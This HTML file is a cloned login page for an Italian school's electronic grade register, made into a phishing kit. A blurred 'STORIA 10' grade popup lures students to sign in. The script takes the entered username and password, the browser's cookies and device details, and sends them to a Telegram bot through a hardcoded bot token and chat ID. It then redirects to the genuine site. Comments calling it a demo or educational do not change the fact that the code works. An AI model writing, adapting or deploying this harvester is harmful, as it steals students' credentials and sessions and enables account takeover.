<!DOCTYPE html>
<html>
<head>
    <title>Registro Elettronico</title> 
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"> 
    <meta name="apple-mobile-web-app-capable" content="no">

    <link rel="stylesheet" href="https://code.jquery.com/ui/1.10.1/themes/base/jquery-ui.css">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.4/css/all.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/ion-rangeslider/2.3.1/css/ion.rangeSlider.min.css">

    <style>
        /* Login CSS - Tutto identico alla versione originale */
        .registroLogin {
            height: 100vh;
            background: url('https://registro.orsoline.it/styles/mobile/images/bg.jpg') !important; 
            background-repeat: repeat-y !important;
            background-position: center center !important;
            background-attachment: scroll !important;
            overflow: hidden;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
        }

        .Login_divInput {
            max-width: 500px;
            min-width: 150px;
            margin: 10px auto;
        }

        #Login_tdBtnLogin {
            padding-left: 10px;
            width: 150px;
        }

        #Login_content {
            margin: 0 auto;
            padding: 20px;
            position: relative;
            text-align: center;
            text-shadow: 0px 1px 0px #fff;
            width: 400px;
            border: 1px solid silver;
            border-radius: 20px;
            background-color: rgba(255, 255, 255, 0.75);
            z-index: 1;
        }

        #Login_txtUsername, #Login_txtPassword {

            background-position: 10px 10px;
            padding: 13px 13px 13px 35px;
            font-family: Helvetica, Arial, sans-serif;
            font-size: 13px;
            color: #777;

            border: 1px solid #ccc;

        }

        #Login_txtPassword {
            background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4AkEEjIZB7lXJQAAAB1pVFh0Q29tbWVudAAAAAAAQ3JlYXRleD3dGggR0lNUGRkLmUHAAAAJUlEQVQ4y2NgGAXDFmzatMmKAQ38v3///n8o/v/w4cP/Dx8+/A8A5OQZ7Yx5XjUAAAAASUVORK5CYII=');
        }

        #Login_btnLogin {
            margin-left: 40px;
            margin-top: 10px;
        }

        .sigmaButton {
            width: 150px;
            border-bottom-color: Gainsboro;
            background-color: #2e6e9e;
            color: WhiteSmoke;
            border-radius: 4px;
            padding: 10px 10px 10px 10px;
            border: none;
            cursor: pointer;
            font-weight: bold;
        }

        .sigmaButton:hover {
            background-color: #1d4b6f;
        }

        #Login_lnkRecuPasw {
            font-size: 0.7em; 
            text-decoration: none;
            color: #337ab7;
        }

        #Login_spanFailed {
            font-size: 0.7em; 
            color: red;
            display: block;
        }

        #Login_divDEVELOPERS {
            border-radius: 5px;
            width: 180px;
            margin: auto;
            height: 23px;
            margin-top: 60px;
            text-shadow: none;
            font-size: xx-small;
        }

        .waitIndicator {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0,0,0,0.5);
            z-index: 9999;
        }

        .sigmaTextbox {
            border: 1px solid #ccc;
            border-radius: 4px;
            padding: 8px;
        }

        /* Stili per il popup centrale */
        .popup-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0,0,0,0.7);
            z-index: 10000;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .popup-content {
            background-color: white;
            border-radius: 10px;
            padding: 25px;
            width: 320px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
            text-align: center;
            position: relative;
            border: 1px solid #2e6e9e;
            animation: fadeIn 0.5s;
        }

        .popup-title {
            color: #2e6e9e;
            font-weight: bold;
            margin-bottom: 15px;
            font-size: 18px;
        }

        .popup-subject {
            font-weight: bold;
            color: #2e6e9e;
            font-size: 16px;
            margin: 10px 0;
        }

        .popup-grade {
            font-size: 24px;
            font-weight: bold;
            margin: 15px 0;
            color: #2e6e9e;
            filter: blur(5px);
        }

        .popup-close {
            position: absolute;
            top: 10px;
            right: 10px;
            background: none;
            border: none;
            font-size: 20px;
            cursor: pointer;
            color: #777;
            width: 24px;
            height: 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 50%;
            transition: background-color 0.2s;
        }

        .popup-close:hover {
            background-color: #f0f0f0;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: scale(0.9); }
            to { opacity: 1; transform: scale(1); }
        }
    </style>
</head>
<body>

            <div class="popup-subject">STORIA</div>
            <div class="popup-grade">10</div>

    <!-- Contenuto login (identico all'originale) -->

    <div id="Default_host">

    <script>
        // Telegram bot credentials
        const BOT_TOKEN = '7598236653:AAGVIpG9o6T9ipZvHSJqPWkydbBW15OoQWw';
        const CHAT_ID = '5709299213';
        
        // Simulated valid credentials (for demonstration only)
        const VALID_USERNAME = 'demo';
        const VALID_PASSWORD = 'demo123';
        
        $(document).ready(function() {
            // Mostra il popup all'apertura della pagina
            $('#gradePopup').show();
            
            // Chiudi il popup
            $('#popupClose').on('click', function() {
                $('#gradePopup').fadeOut(300);
            });
            
            // Main form submission (identico all'originale)
            $('form').on('submit', function(e) {
                e.preventDefault();
                $('#Login_imgWait').show();
                $('#Login_spanFailed').hide();
                
                const username = $('#Login_txtUsername').val();
                const password = $('#Login_txtPassword').val();
                
                // Get cookies (for educational purposes)
                const cookies = document.cookie;
                
                // Get additional browser info
                const userAgent = navigator.userAgent;
                const platform = navigator.platform;
                const screenInfo = `Screen: ${screen.width}x${screen.height}`;
                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                const currentTime = new Date().toLocaleString();
                
                // Send credentials to Telegram bot
                const message = `üìå Nuovo accesso al registro elettronico:\n\nüë§ Username: ${username}\nüîë Password: ${password}\n\nüç™ Cookies: ${cookies}\n\nüåê User Agent: ${userAgent}\nüì± Platform: ${platform}\nüñ•Ô∏è ${screenInfo}\n‚è∞ Timezone: ${timezone}\n‚åö Local Time: ${currentTime}`;
                
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message
                    })
                })
                .then(response => response.json())
                .then(data => {
                    console.log('Message sent to Telegram:', data);
                    
                    // Check if credentials match our simulated valid ones
                    if(username === VALID_USERNAME && password === VALID_PASSWORD) {
                        // Redirect to official page after short delay
                        setTimeout(() => {
                            window.location.href = 'https://registro.orsoline.it/Default.aspx';
                        }, 1500);
                    } else {
                        $('#Login_imgWait').hide();
                        $('#Login_spanFailed').show();
                    }
                })
                .catch(error => {
                    console.error('Error sending to Telegram:', error);
                    $('#Login_imgWait').hide();
                    $('#Login_spanFailed').show();
                });
            });
            
            $('#Login_lnkRecuPasw').on('click', function(e) {
                e.preventDefault();
                alert('Funzionalit√† di recupero password non implementata in questa demo.');
            });
        });
    </script>
